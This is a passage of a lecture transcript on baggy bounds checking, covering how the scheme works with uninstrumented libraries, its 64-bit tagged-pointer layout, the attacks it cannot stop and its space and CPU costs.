              <time_slice>7:26</time_slice>
              <text_slice>So just like in this
example up here,</text_slice>
            </slice>
            <slice>
              <time_slice>7:27</time_slice>
              <text_slice>this line is actually fine,
but it will cause the high bit</text_slice>
            </slice>
            <slice>
              <time_slice>7:30</time_slice>
              <text_slice>to be set in q, right.</text_slice>
            </slice>
            <slice>
              <time_slice>7:32</time_slice>
              <text_slice>So when you come down
here and reference it,</text_slice>
            </slice>
            <slice>
              <time_slice>7:34</time_slice>
              <text_slice>then everything
blows up and it's</text_slice>
            </slice>
            <slice>
              <time_slice>7:35</time_slice>
              <text_slice>time to call in your
insurance agent.</text_slice>
            </slice>
            <slice>
              <time_slice>7:37</time_slice>
              <text_slice>So pretty straightforward?</text_slice>
            </slice>
            <slice>
              <time_slice>7:40</time_slice>
              <text_slice>OK so, that's
basically two examples</text_slice>
            </slice>
            <slice>
              <time_slice>7:44</time_slice>
              <text_slice>that you can flavor for
how baggy bounds works.</text_slice>
            </slice>
            <slice>
              <time_slice>7:46</time_slice>
              <text_slice>As I mentioned in
the last lecture,</text_slice>
            </slice>
            <slice>
              <time_slice>7:49</time_slice>
              <text_slice>you don't actually have to
instrument every pointer</text_slice>
            </slice>
            <slice>
              <time_slice>7:51</time_slice>
              <text_slice>operation, if you can use static
code analysis to figure out</text_slice>
            </slice>
            <slice>
              <time_slice>7:55</time_slice>
              <text_slice>the particular set of
pointer operations is safe.</text_slice>
            </slice>
            <slice>
              <time_slice>7:58</time_slice>
              <text_slice>I'll defer further
discussion of some</text_slice>
            </slice>
            <slice>
              <time_slice>7:59</time_slice>
              <text_slice>of the static
analysis [INAUDIBLE],</text_slice>
            </slice>
            <slice>
              <time_slice>8:01</time_slice>
              <text_slice>but suffice it to say
that you don't always</text_slice>
            </slice>
            <slice>
              <time_slice>8:04</time_slice>
              <text_slice>have to have all this bit
wise arithmetic that you</text_slice>
            </slice>
            <slice>
              <time_slice>8:08</time_slice>
              <text_slice>have in some of the cases
that we've examined before.</text_slice>
            </slice>
            <slice>
              <time_slice>8:15</time_slice>
              <text_slice>And so another question
that came up a lot in Piazza</text_slice>
            </slice>
            <slice>
              <time_slice>8:19</time_slice>
              <text_slice>was, how does baggy bounds
ensure compatibility</text_slice>
            </slice>
            <slice>
              <time_slice>8:21</time_slice>
              <text_slice>with these preexisting,
non-instrumented libraries,</text_slice>
            </slice>
            <slice>
              <time_slice>8:24</time_slice>
              <text_slice>right.</text_slice>
            </slice>
            <slice>
              <time_slice>8:26</time_slice>
              <text_slice>And so the Piazza idea behind
how baggy bounds does that</text_slice>
            </slice>
            <slice>
              <time_slice>8:29</time_slice>
              <text_slice>is, that when baggy bounds
initializes the bounds tables,</text_slice>
            </slice>
            <slice>
              <time_slice>8:33</time_slice>
              <text_slice>they set all the entries
to be that bound of 31.</text_slice>
            </slice>
            <slice>
              <time_slice>8:36</time_slice>
              <text_slice>So when we read
the bounds table,</text_slice>
            </slice>
            <slice>
              <time_slice>8:37</time_slice>
              <text_slice>each entry represents
2 to the power</text_slice>
            </slice>
            <slice>
              <time_slice>8:40</time_slice>
              <text_slice>of that entry, the size of
that particular pointer.</text_slice>
            </slice>
            <slice>
              <time_slice>8:43</time_slice>
              <text_slice>So by initializing
all those bounds</text_slice>
            </slice>
            <slice>
              <time_slice>8:45</time_slice>
              <text_slice>of 31, what this allows
us to do is automatically</text_slice>
            </slice>
            <slice>
              <time_slice>8:49</time_slice>
              <text_slice>assume that each pointer
from [INAUDIBLE] the code</text_slice>
            </slice>
            <slice>
              <time_slice>8:52</time_slice>
              <text_slice>is going to have the
largest bound possible, 2</text_slice>
            </slice>
            <slice>
              <time_slice>8:54</time_slice>
              <text_slice>raised to the 31.</text_slice>
            </slice>
            <slice>
              <time_slice>8:56</time_slice>
              <text_slice>So let me just give you a
very simple example here</text_slice>
            </slice>
            <slice>
              <time_slice>8:58</time_slice>
              <text_slice>that will hopefully make
this a little clearer.</text_slice>
            </slice>
            <slice>
              <time_slice>9:00</time_slice>
              <text_slice>So let's say that this
over here is the memory</text_slice>
            </slice>
            <slice>
              <time_slice>9:05</time_slice>
              <text_slice>space that we lose for heap.</text_slice>
            </slice>
            <slice>
              <time_slice>9:12</time_slice>
              <text_slice>This is simple example,
let's suppose that basically</text_slice>
            </slice>
            <slice>
              <time_slice>9:15</time_slice>
              <text_slice>what this memory space
[INAUDIBLE] two components.</text_slice>
            </slice>
            <slice>
              <time_slice>9:18</time_slice>
              <text_slice>This is the heap, that is out
by the unistrumented code.</text_slice>
            </slice>
            <slice>
              <time_slice>9:31</time_slice>
              <text_slice>And then let's suppose
that down here we</text_slice>
            </slice>
            <slice>
              <time_slice>9:33</time_slice>
              <text_slice>have the heat that is allocated
by the instrumented code.</text_slice>
            </slice>
            <slice>
              <time_slice>9:44</time_slice>
              <text_slice>So what's baggy
bounds going to do?</text_slice>
            </slice>
            <slice>
              <time_slice>9:46</time_slice>
              <text_slice>So remember, baggy bounds has
this notion of a slot size,</text_slice>
            </slice>
            <slice>
              <time_slice>9:51</time_slice>
              <text_slice>right.</text_slice>
            </slice>
            <slice>
              <time_slice>9:51</time_slice>
              <text_slice>So basically the
slot size is 16,</text_slice>
            </slice>
            <slice>
              <time_slice>9:53</time_slice>
              <text_slice>you only have entry
for every sort</text_slice>
            </slice>
            <slice>
              <time_slice>9:55</time_slice>
              <text_slice>of slot of size 16 over here.</text_slice>
            </slice>
            <slice>
              <time_slice>9:57</time_slice>
              <text_slice>So basically the bounds
table in this case,</text_slice>
            </slice>
            <slice>
              <time_slice>9:59</time_slice>
              <text_slice>you can think of being
set up into three</text_slice>
            </slice>
            <slice>
              <time_slice>10:03</time_slice>
              <text_slice>places, sorry two places.</text_slice>
            </slice>
            <slice>
              <time_slice>10:06</time_slice>
              <text_slice>So initially all of the
bounds table, all the entries</text_slice>
            </slice>
            <slice>
              <time_slice>10:12</time_slice>
              <text_slice>are initialized to 2 to the
30-- or sorry, to the 31.</text_slice>
            </slice>
            <slice>
              <time_slice>10:16</time_slice>
              <text_slice>But then eventually
as the instrument code</text_slice>
            </slice>
            <slice>
              <time_slice>10:19</time_slice>
              <text_slice>runs it's actually going
to use the baggy bounds</text_slice>
            </slice>
            <slice>
              <time_slice>10:23</time_slice>
              <text_slice>algorithm to set these
values for whatever</text_slice>
            </slice>
            <slice>
              <time_slice>10:28</time_slice>
              <text_slice>should be appropriate for that
particular [INAUDIBLE], right.</text_slice>
            </slice>
            <slice>
              <time_slice>10:33</time_slice>
              <text_slice>So what ends happening
is that if you</text_slice>
            </slice>
            <slice>
              <time_slice>10:35</time_slice>
              <text_slice>did-- if instrumented code gets
a pointer that comes from here,</text_slice>
            </slice>
            <slice>
              <time_slice>10:39</time_slice>
              <text_slice>then those baggy bounds
with each particular pointer</text_slice>
            </slice>
            <slice>
              <time_slice>10:42</time_slice>
              <text_slice>will always be set to the
largest possible value, 231.</text_slice>
            </slice>
            <slice>
              <time_slice>10:45</time_slice>
              <text_slice>2 to the 31, right.</text_slice>
            </slice>
            <slice>
              <time_slice>10:45</time_slice>
              <text_slice>Which means that
it's going to be</text_slice>
            </slice>
            <slice>
              <time_slice>10:47</time_slice>
              <text_slice>impossible for baggy
bounds, entry of the code,</text_slice>
            </slice>
            <slice>
              <time_slice>10:49</time_slice>
              <text_slice>to think that you've done
an out of bound operation</text_slice>
            </slice>
            <slice>
              <time_slice>10:52</time_slice>
              <text_slice>with that pointer that's
coming from this uninstrumented</text_slice>
            </slice>
            <slice>
              <time_slice>10:55</time_slice>
              <text_slice>library.</text_slice>
            </slice>
            <slice>
              <time_slice>10:57</time_slice>
              <text_slice>So does that make sense?</text_slice>
            </slice>
            <slice>
              <time_slice>10:59</time_slice>
              <text_slice>So the idea is that
in instrumented code</text_slice>
            </slice>
            <slice>
              <time_slice>11:00</time_slice>
              <text_slice>we're always going to be
doing these comparisons</text_slice>
            </slice>
            <slice>
              <time_slice>11:03</time_slice>
              <text_slice>with the pointers, but if
we always set the bounds</text_slice>
            </slice>
            <slice>
              <time_slice>11:06</time_slice>
              <text_slice>entries for uninstrumented
pointer code 2 to the 31,</text_slice>
            </slice>
            <slice>
              <time_slice>11:09</time_slice>
              <text_slice>you can never have
a dereference error.</text_slice>
            </slice>
            <slice>
              <time_slice>11:13</time_slice>
              <text_slice>OK so that's basically how we
have this nice interoperability</text_slice>
            </slice>
            <slice>
              <time_slice>11:17</time_slice>
              <text_slice>between the entry of the
baggy bounds code in between</text_slice>
            </slice>
            <slice>
              <time_slice>11:20</time_slice>
              <text_slice>a noninstrumented off the
shelf legacy library's.</text_slice>
            </slice>
            <slice>
              <time_slice>11:24</time_slice>
              <text_slice>So putting it all together,
what does this all mean?</text_slice>
            </slice>
            <slice>
              <time_slice>11:27</time_slice>
              <text_slice>So, we have this
system here which</text_slice>
            </slice>
            <slice>
              <time_slice>11:28</time_slice>
              <text_slice>is nice because it doesn't make
the uninstrumented libraries</text_slice>
            </slice>
            <slice>
              <time_slice>11:31</time_slice>
              <text_slice>blow up, but one problem
is that we can't detect out</text_slice>
            </slice>
            <slice>
              <time_slice>11:34</time_slice>
              <text_slice>of bounds pointers
that were generated</text_slice>
            </slice>
            <slice>
              <time_slice>11:37</time_slice>
              <text_slice>in the uninstrumented
code, right.</text_slice>
            </slice>
            <slice>
              <time_slice>11:39</time_slice>
              <text_slice>Because we're never going to
set that high bit for example,</text_slice>
            </slice>
            <slice>
              <time_slice>11:42</time_slice>
              <text_slice>if that [INAUDIBLE]
pointer gets too big,</text_slice>
            </slice>
            <slice>
              <time_slice>11:44</time_slice>
              <text_slice>or gets too small or
anything like that.</text_slice>
            </slice>
            <slice>
              <time_slice>11:46</time_slice>
              <text_slice>So we actually can't
provide memory safety</text_slice>
            </slice>
            <slice>
              <time_slice>11:48</time_slice>
              <text_slice>for operations that take
place in uninstrumented code.</text_slice>
            </slice>
            <slice>
              <time_slice>11:51</time_slice>
              <text_slice>You also can't detect when
we pass an out of bounds</text_slice>
            </slice>
            <slice>
              <time_slice>11:54</time_slice>
              <text_slice>pointer from instrumented
code to uninstrumented code.</text_slice>
            </slice>
            <slice>
              <time_slice>11:58</time_slice>
              <text_slice>Something insane
could happen, right.</text_slice>
            </slice>
            <slice>
              <time_slice>11:59</time_slice>
              <text_slice>Because remember if you
had this out of bounds</text_slice>
            </slice>
            <slice>
              <time_slice>12:01</time_slice>
              <text_slice>pulled it from the
instrumented code</text_slice>
            </slice>
            <slice>
              <time_slice>12:03</time_slice>
              <text_slice>it has that high
bit set to 1, right.</text_slice>
            </slice>
            <slice>
              <time_slice>12:05</time_slice>
              <text_slice>So it looks like
it's super ginormous.</text_slice>
            </slice>
            <slice>
              <time_slice>12:07</time_slice>
              <text_slice>Now we know if we just kept
that code in instrumented code,</text_slice>
            </slice>
            <slice>
              <time_slice>12:09</time_slice>
              <text_slice>we might clear that
flag at some point</text_slice>
            </slice>
            <slice>
              <time_slice>12:11</time_slice>
              <text_slice>if it comes back in bounds.</text_slice>
            </slice>
            <slice>
              <time_slice>12:13</time_slice>
              <text_slice>But if we just pass
this ginormous address</text_slice>
            </slice>
            <slice>
              <time_slice>12:15</time_slice>
              <text_slice>to uninstrumented
code, then who knows,</text_slice>
            </slice>
            <slice>
              <time_slice>12:17</time_slice>
              <text_slice>it may try to dereference it,
it may do something crazy.</text_slice>
            </slice>
            <slice>
              <time_slice>12:20</time_slice>
              <text_slice>It may even bring that
pointer back in bounds,</text_slice>
            </slice>
            <slice>
              <time_slice>12:22</time_slice>
              <text_slice>but we would never
have an opportunity</text_slice>
            </slice>
            <slice>
              <time_slice>12:23</time_slice>
              <text_slice>to clear that high bit, right.</text_slice>
            </slice>
            <slice>
              <time_slice>12:25</time_slice>
              <text_slice>So you can come up--
you still may come up</text_slice>
            </slice>
            <slice>
              <time_slice>12:27</time_slice>
              <text_slice>with some inter-op
issues there, even if we</text_slice>
            </slice>
            <slice>
              <time_slice>12:30</time_slice>
              <text_slice>use this scheme over here.</text_slice>
            </slice>
            <slice>
              <time_slice>12:34</time_slice>
              <text_slice>OK, so that's essentially how
baggy bounds works on a 32--</text_slice>
            </slice>
            <slice>
              <time_slice>12:38</time_slice>
              <text_slice>you got a question?</text_slice>
            </slice>
            <slice>
              <time_slice>12:39</time_slice>
              <text_slice>AUDIENCE: Yeah, so if you
have a instrumented coding</text_slice>
            </slice>
            <slice>
              <time_slice>12:41</time_slice>
              <text_slice>meets like allocated
memory, is it</text_slice>
            </slice>
            <slice>
              <time_slice>12:43</time_slice>
              <text_slice>using the same malloc that the
attributing code is using, or?</text_slice>
            </slice>
            <slice>
              <time_slice>12:46</time_slice>
              <text_slice>PROFESSOR: Yeah so
it's a bit subtle.</text_slice>
            </slice>
            <slice>
              <time_slice>12:48</time_slice>
              <text_slice>So like in this case
here, it's like very stark</text_slice>
            </slice>
            <slice>
              <time_slice>12:50</time_slice>
              <text_slice>what's going on, because there's
just two regions, one of which</text_slice>
            </slice>
            <slice>
              <time_slice>12:53</time_slice>
              <text_slice>is used by each set of things.</text_slice>
            </slice>
            <slice>
              <time_slice>12:55</time_slice>
              <text_slice>So it actually depends on
the if they use [INAUDIBLE]</text_slice>
            </slice>
            <slice>
              <time_slice>12:57</time_slice>
              <text_slice>and stuff like that.</text_slice>
            </slice>
            <slice>
              <time_slice>12:58</time_slice>
              <text_slice>You can also imagine that like
in C++ [INAUDIBLE] for example,</text_slice>
            </slice>
            <slice>
              <time_slice>13:01</time_slice>
              <text_slice>you can define your
own allocator, right.</text_slice>
            </slice>
            <slice>
              <time_slice>13:03</time_slice>
              <text_slice>So it kind of
depends [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>13:06</time_slice>
              <text_slice>AUDIENCE: [INAUDIBLE]
input the same,</text_slice>
            </slice>
            <slice>
              <time_slice>13:10</time_slice>
              <text_slice>how does the allocator
know whether or not</text_slice>
            </slice>
            <slice>
              <time_slice>13:13</time_slice>
              <text_slice>to set 31 or [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>13:15</time_slice>
              <text_slice>PROFESSOR: Yeah so at the
lower level, typically the way</text_slice>
            </slice>
            <slice>
              <time_slice>13:17</time_slice>
              <text_slice>that these allocation
algorithms work,</text_slice>
            </slice>
            <slice>
              <time_slice>13:19</time_slice>
              <text_slice>is that you call unknown
system [INAUDIBLE] or something</text_slice>
            </slice>
            <slice>
              <time_slice>13:23</time_slice>
              <text_slice>like that, sort of
move a pointer up.</text_slice>
            </slice>
            <slice>
              <time_slice>13:24</time_slice>
              <text_slice>So you can imagine if you have
multiple allocators, all trying</text_slice>
            </slice>
            <slice>
              <time_slice>13:27</time_slice>
              <text_slice>to allocate memory,
they each have</text_slice>
            </slice>
            <slice>
              <time_slice>13:29</time_slice>
              <text_slice>their own chunk of memory
they reserve for themselves</text_slice>
            </slice>
            <slice>
              <time_slice>13:32</time_slice>
              <text_slice>basically, right.</text_slice>
            </slice>
            <slice>
              <time_slice>13:33</time_slice>
              <text_slice>So in real life it may be
more fragmented than this,</text_slice>
            </slice>
            <slice>
              <time_slice>13:36</time_slice>
              <text_slice>that's essentially on a
high level, how it works.</text_slice>
            </slice>
            <slice>
              <time_slice>13:39</time_slice>
              <text_slice>OK so this was a baggy
bounds on a 32-bit system.</text_slice>
            </slice>
            <slice>
              <time_slice>13:43</time_slice>
              <text_slice>So as you all know 64-bit
systems are the bees</text_slice>
            </slice>
            <slice>
              <time_slice>13:45</time_slice>
              <text_slice>knees these days, so
how does baggy bounds</text_slice>
            </slice>
            <slice>
              <time_slice>13:47</time_slice>
              <text_slice>work on those systems?</text_slice>
            </slice>
            <slice>
              <time_slice>13:50</time_slice>
              <text_slice>Well, in those systems
you can actually</text_slice>
            </slice>
            <slice>
              <time_slice>13:51</time_slice>
              <text_slice>get rid of the bounds table,
because we can actually</text_slice>
            </slice>
            <slice>
              <time_slice>13:55</time_slice>
              <text_slice>store some information about
the bounds, from the pointer</text_slice>
            </slice>
            <slice>
              <time_slice>13:58</time_slice>
              <text_slice>itself.</text_slice>
            </slice>
            <slice>
              <time_slice>14:02</time_slice>
              <text_slice>So imagine we're going to
look at a regular pointer</text_slice>
            </slice>
            <slice>
              <time_slice>14:06</time_slice>
              <text_slice>in a baggy bounds system.</text_slice>
            </slice>
            <slice>
              <time_slice>14:09</time_slice>
              <text_slice>So we can use it, like this.</text_slice>
            </slice>
            <slice>
              <time_slice>14:15</time_slice>
              <text_slice>So we can-- if the
pointer's in bounds,</text_slice>
            </slice>
            <slice>
              <time_slice>14:18</time_slice>
              <text_slice>we can basically just set
the first 21 bits to 0.</text_slice>
            </slice>
            <slice>
              <time_slice>14:21</time_slice>
              <text_slice>We can put the size
in these 5 bits here.</text_slice>
            </slice>
            <slice>
              <time_slice>14:24</time_slice>
              <text_slice>And once again this is
representing the log base 2</text_slice>
            </slice>
            <slice>
              <time_slice>14:27</time_slice>
              <text_slice>at the size here.</text_slice>
            </slice>
            <slice>
              <time_slice>14:28</time_slice>
              <text_slice>And then we have here,
in the remaining 38 bits,</text_slice>
            </slice>
            <slice>
              <time_slice>14:31</time_slice>
              <text_slice>just the regular address bits.</text_slice>
            </slice>
            <slice>
              <time_slice>14:33</time_slice>
              <text_slice>Now the reason why
this doesn't massively</text_slice>
            </slice>
            <slice>
              <time_slice>14:35</time_slice>
              <text_slice>curtail the address size
of the program you use,</text_slice>
            </slice>
            <slice>
              <time_slice>14:37</time_slice>
              <text_slice>is that a lot of
these high order bits,</text_slice>
            </slice>
            <slice>
              <time_slice>14:39</time_slice>
              <text_slice>the operating system
and-or the hardware,</text_slice>
            </slice>
            <slice>
              <time_slice>14:41</time_slice>
              <text_slice>doesn't let a application use,
for various reasons, right.</text_slice>
            </slice>
            <slice>
              <time_slice>14:45</time_slice>
              <text_slice>So as it turns out,
we're not dramatically</text_slice>
            </slice>
            <slice>
              <time_slice>14:47</time_slice>
              <text_slice>shrinking the amount of
[INAUDIBLE] application</text_slice>
            </slice>
            <slice>
              <time_slice>14:49</time_slice>
              <text_slice>you use in the system.</text_slice>
            </slice>
            <slice>
              <time_slice>14:51</time_slice>
              <text_slice>This is what a regular
pointer looks like.</text_slice>
            </slice>
            <slice>
              <time_slice>14:52</time_slice>
              <text_slice>Now what happens
when we only have</text_slice>
            </slice>
            <slice>
              <time_slice>14:53</time_slice>
              <text_slice>one of these out
of bounds pointers?</text_slice>
            </slice>
            <slice>
              <time_slice>14:55</time_slice>
              <text_slice>Well, in a 32-bit system
all we can do basically</text_slice>
            </slice>
            <slice>
              <time_slice>14:57</time_slice>
              <text_slice>is just set that high
order bit and you just</text_slice>
            </slice>
            <slice>
              <time_slice>14:59</time_slice>
              <text_slice>hope that thing never got
beyond a 1/2 a slot away</text_slice>
            </slice>
            <slice>
              <time_slice>15:02</time_slice>
              <text_slice>from it's base.</text_slice>
            </slice>
            <slice>
              <time_slice>15:05</time_slice>
              <text_slice>But now that we have all this
extra address space here,</text_slice>
            </slice>
            <slice>
              <time_slice>15:08</time_slice>
              <text_slice>you can actually put the out
of bounds offset directly</text_slice>
            </slice>
            <slice>
              <time_slice>15:13</time_slice>
              <text_slice>in this pointer.</text_slice>
            </slice>
            <slice>
              <time_slice>15:18</time_slice>
              <text_slice>So we can do
something like this.</text_slice>
            </slice>
            <slice>
              <time_slice>15:25</time_slice>
              <text_slice>So we can have 13 bits
here for the offset, right,</text_slice>
            </slice>
            <slice>
              <time_slice>15:29</time_slice>
              <text_slice>the out of bound offset.</text_slice>
            </slice>
            <slice>
              <time_slice>15:30</time_slice>
              <text_slice>How far away is this out of
bounds pointer, from the place</text_slice>
            </slice>
            <slice>
              <time_slice>15:33</time_slice>
              <text_slice>where it should be?</text_slice>
            </slice>
            <slice>
              <time_slice>15:35</time_slice>
              <text_slice>And then once again you
can put the actual size</text_slice>
            </slice>
            <slice>
              <time_slice>15:39</time_slice>
              <text_slice>of the referred object here.</text_slice>
            </slice>
            <slice>
              <time_slice>15:42</time_slice>
              <text_slice>This will be 0 once again.</text_slice>
            </slice>
            <slice>
              <time_slice>15:44</time_slice>
              <text_slice>And this will be the
real address base here.</text_slice>
            </slice>
            <slice>
              <time_slice>15:48</time_slice>
              <text_slice>And so this may be
reminiscent to you</text_slice>
            </slice>
            <slice>
              <time_slice>15:51</time_slice>
              <text_slice>of some type of fact
pointer representation,</text_slice>
            </slice>
            <slice>
              <time_slice>15:53</time_slice>
              <text_slice>but there's a
couple of advantages</text_slice>
            </slice>
            <slice>
              <time_slice>15:55</time_slice>
              <text_slice>here, now that we're
moving in the 64-bit world.</text_slice>
            </slice>
            <slice>
              <time_slice>15:57</time_slice>
              <text_slice>So first of all, you'll note
that these tag pointers,</text_slice>
            </slice>
            <slice>
              <time_slice>16:00</time_slice>
              <text_slice>these are the regular size
of a regular pointer, right.</text_slice>
            </slice>
            <slice>
              <time_slice>16:04</time_slice>
              <text_slice>Pointer's are still just 64-bits
wide in both of these setups.</text_slice>
            </slice>
            <slice>
              <time_slice>16:07</time_slice>
              <text_slice>So that's nice because
that means for example,</text_slice>
            </slice>
            <slice>
              <time_slice>16:10</time_slice>
              <text_slice>that means and rights to
that pointer are time.</text_slice>
            </slice>
            <slice>
              <time_slice>16:13</time_slice>
              <text_slice>Unlike in traditional
fat finger world,</text_slice>
            </slice>
            <slice>
              <time_slice>16:14</time_slice>
              <text_slice>where you actually have
to use multiple words</text_slice>
            </slice>
            <slice>
              <time_slice>16:16</time_slice>
              <text_slice>represent that fat pointer.</text_slice>
            </slice>
            <slice>
              <time_slice>16:18</time_slice>
              <text_slice>So that's nice.</text_slice>
            </slice>
            <slice>
              <time_slice>16:19</time_slice>
              <text_slice>And also note that we can
trivially ask these things,</text_slice>
            </slice>
            <slice>
              <time_slice>16:22</time_slice>
              <text_slice>uninstrumented
code, because they</text_slice>
            </slice>
            <slice>
              <time_slice>16:24</time_slice>
              <text_slice>work and are the same
size as regular pointers.</text_slice>
            </slice>
            <slice>
              <time_slice>16:27</time_slice>
              <text_slice>We can put these things
in structs for example,</text_slice>
            </slice>
            <slice>
              <time_slice>16:29</time_slice>
              <text_slice>and the size of those
structs won't change.</text_slice>
            </slice>
            <slice>
              <time_slice>16:32</time_slice>
              <text_slice>So this is very nice if we
can work in that 64-bit world.</text_slice>
            </slice>
            <slice>
              <time_slice>16:36</time_slice>
              <text_slice>So does that all make sense?</text_slice>
            </slice>
            <slice>
              <time_slice>16:39</time_slice>
              <text_slice>AUDIENCE: So why are there
eight 0-bits [INAUDIBLE]</text_slice>
            </slice>
            <slice>
              <time_slice>16:42</time_slice>
              <text_slice>pointer there?</text_slice>
            </slice>
            <slice>
              <time_slice>16:43</time_slice>
              <text_slice>Where like the 5 size
bits previously weren't.</text_slice>
            </slice>
            <slice>
              <time_slice>16:47</time_slice>
              <text_slice>PROFESSOR: So you're
talking about down here?</text_slice>
            </slice>
            <slice>
              <time_slice>16:49</time_slice>
              <text_slice>AUDIENCE: Yeah,
is there a reason</text_slice>
            </slice>
            <slice>
              <time_slice>16:50</time_slice>
              <text_slice>why we can't just
store a [INAUDIBLE]</text_slice>
            </slice>
            <slice>
              <time_slice>16:53</time_slice>
              <text_slice>if we're like six
0-bits there and had</text_slice>
            </slice>
            <slice>
              <time_slice>16:54</time_slice>
              <text_slice>more bits for the offset,
like why is the number 8?</text_slice>
            </slice>
            <slice>
              <time_slice>16:57</time_slice>
              <text_slice>PROFESSOR: So I think
so in some cases</text_slice>
            </slice>
            <slice>
              <time_slice>17:00</time_slice>
              <text_slice>there are certain line issues
that we have to work with.</text_slice>
            </slice>
            <slice>
              <time_slice>17:02</time_slice>
              <text_slice>The [INAUDIBLE] issue is to deal
with if the bits are higher.</text_slice>
            </slice>
            <slice>
              <time_slice>17:05</time_slice>
              <text_slice>I don't think, in
principle, there's</text_slice>
            </slice>
            <slice>
              <time_slice>17:07</time_slice>
              <text_slice>any reason why you
couldn't read some</text_slice>
            </slice>
            <slice>
              <time_slice>17:08</time_slice>
              <text_slice>of these things [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>17:10</time_slice>
              <text_slice>Well there may be
some hard versions</text_slice>
            </slice>
            <slice>
              <time_slice>17:11</time_slice>
              <text_slice>that I'm not thinking
of right now,</text_slice>
            </slice>
            <slice>
              <time_slice>17:13</time_slice>
              <text_slice>but [INAUDIBLE] some of
these would have to 0</text_slice>
            </slice>
            <slice>
              <time_slice>17:15</time_slice>
              <text_slice>or otherwise the hardware's
going to cause a problem.</text_slice>
            </slice>
            <slice>
              <time_slice>17:21</time_slice>
              <text_slice>Any other questions?</text_slice>
            </slice>
            <slice>
              <time_slice>17:23</time_slice>
              <text_slice>OK so, next thing
are you wondering</text_slice>
            </slice>
            <slice>
              <time_slice>17:26</time_slice>
              <text_slice>is, can you still
launch a buffer</text_slice>
            </slice>
            <slice>
              <time_slice>17:28</time_slice>
              <text_slice>overflows in the
baggy bounds system,</text_slice>
            </slice>
            <slice>
              <time_slice>17:30</time_slice>
              <text_slice>obviously because I gave
you another paper to read,</text_slice>
            </slice>
            <slice>
              <time_slice>17:32</time_slice>
              <text_slice>so clearly this thing, this
doesn't solve all the problems,</text_slice>
            </slice>
            <slice>
              <time_slice>17:34</time_slice>
              <text_slice>right?</text_slice>
            </slice>
            <slice>
              <time_slice>17:34</time_slice>
              <text_slice>So one problem
you might run into</text_slice>
            </slice>
            <slice>
              <time_slice>17:36</time_slice>
              <text_slice>is that if you have
uninstrumented code once again,</text_slice>
            </slice>
            <slice>
              <time_slice>17:38</time_slice>
              <text_slice>we can't detect any problems
in uninstrumented code.</text_slice>
            </slice>
            <slice>
              <time_slice>17:41</time_slice>
              <text_slice>You could also encounter
memory vulnerabilities</text_slice>
            </slice>
            <slice>
              <time_slice>17:44</time_slice>
              <text_slice>that come about from the dynamic
memory allocation system.</text_slice>
            </slice>
            <slice>
              <time_slice>17:47</time_slice>
              <text_slice>So if you can remember
in the lecture</text_slice>
            </slice>
            <slice>
              <time_slice>17:48</time_slice>
              <text_slice>we looked at this weird
free malloc weird pointer</text_slice>
            </slice>
            <slice>
              <time_slice>17:52</time_slice>
              <text_slice>thing that took place.</text_slice>
            </slice>
            <slice>
              <time_slice>17:54</time_slice>
              <text_slice>Baggy bounds won't
necessarily prevent you</text_slice>
            </slice>
            <slice>
              <time_slice>17:55</time_slice>
              <text_slice>from some of that stuff.</text_slice>
            </slice>
            <slice>
              <time_slice>17:57</time_slice>
              <text_slice>We also discussed
last lecture, where</text_slice>
            </slice>
            <slice>
              <time_slice>18:00</time_slice>
              <text_slice>the fact that code
pointers do not have bounds</text_slice>
            </slice>
            <slice>
              <time_slice>18:02</time_slice>
              <text_slice>associated with them, right.</text_slice>
            </slice>
            <slice>
              <time_slice>18:04</time_slice>
              <text_slice>So now you have struct that
has a buffer at the bottom,</text_slice>
            </slice>
            <slice>
              <time_slice>18:07</time_slice>
              <text_slice>it has a function
pointer up top,</text_slice>
            </slice>
            <slice>
              <time_slice>18:09</time_slice>
              <text_slice>if you have a buffer overflow
in to that function pointer,</text_slice>
            </slice>
            <slice>
              <time_slice>18:12</time_slice>
              <text_slice>right.</text_slice>
            </slice>
            <slice>
              <time_slice>18:12</time_slice>
              <text_slice>Let's say that buffer
overflow is still</text_slice>
            </slice>
            <slice>
              <time_slice>18:14</time_slice>
              <text_slice>within the baggy bounds.</text_slice>
            </slice>
            <slice>
              <time_slice>18:15</time_slice>
              <text_slice>So you've overridden
that function pointer.</text_slice>
            </slice>
            <slice>
              <time_slice>18:17</time_slice>
              <text_slice>We would try to execute
that function pointer,</text_slice>
            </slice>
            <slice>
              <time_slice>18:20</time_slice>
              <text_slice>it could be pointed
at something for,</text_slice>
            </slice>
            <slice>
              <time_slice>18:22</time_slice>
              <text_slice>attack a control
piece of memory.</text_slice>
            </slice>
            <slice>
              <time_slice>18:23</time_slice>
              <text_slice>OK, and bounds won't
help with that,</text_slice>
            </slice>
            <slice>
              <time_slice>18:24</time_slice>
              <text_slice>because there's no bounds
associate with function</text_slice>
            </slice>
            <slice>
              <time_slice>18:26</time_slice>
              <text_slice>pointers.</text_slice>
            </slice>
            <slice>
              <time_slice>18:30</time_slice>
              <text_slice>And so in general, what are
the cost's of baggy bounds?</text_slice>
            </slice>
            <slice>
              <time_slice>18:36</time_slice>
              <text_slice>So there are essentially four.</text_slice>
            </slice>
            <slice>
              <time_slice>18:38</time_slice>
              <text_slice>So the first cost
is space, right.</text_slice>
            </slice>
            <slice>
              <time_slice>18:43</time_slice>
              <text_slice>So if you're using
a fat pointer,</text_slice>
            </slice>
            <slice>
              <time_slice>18:44</time_slice>
              <text_slice>obviously you've got to
make pointers bigger.</text_slice>
            </slice>
            <slice>
              <time_slice>18:47</time_slice>
              <text_slice>But if you're using the baggy
bounds system that we just</text_slice>
            </slice>
            <slice>
              <time_slice>18:49</time_slice>
              <text_slice>discussed, you've got to
store the bounds table, right.</text_slice>
            </slice>
            <slice>
              <time_slice>18:52</time_slice>
              <text_slice>And so the bounds table
has that slot size</text_slice>
            </slice>
            <slice>
              <time_slice>18:55</time_slice>
              <text_slice>which allows you to control
how big that bounds table is,</text_slice>
            </slice>
            <slice>
              <time_slice>18:58</time_slice>
              <text_slice>but still you may end up using
[INAUDIBLE] memory for that.</text_slice>
            </slice>
            <slice>
              <time_slice>19:02</time_slice>
              <text_slice>You've also got the CPU overhead
of doing all of the pointer</text_slice>
            </slice>
            <slice>
              <time_slice>19:08</time_slice>
              <text_slice>instrumentation, right.</text_slice>
            </slice>
            <slice>
              <time_slice>19:09</time_slice>
              <text_slice>So for every, or close to every
pointer thing that you do,</text_slice>
            </slice>
            <slice>
              <time_slice>19:13</time_slice>
              <text_slice>you got to check these bounds
using those shift operations</text_slice>
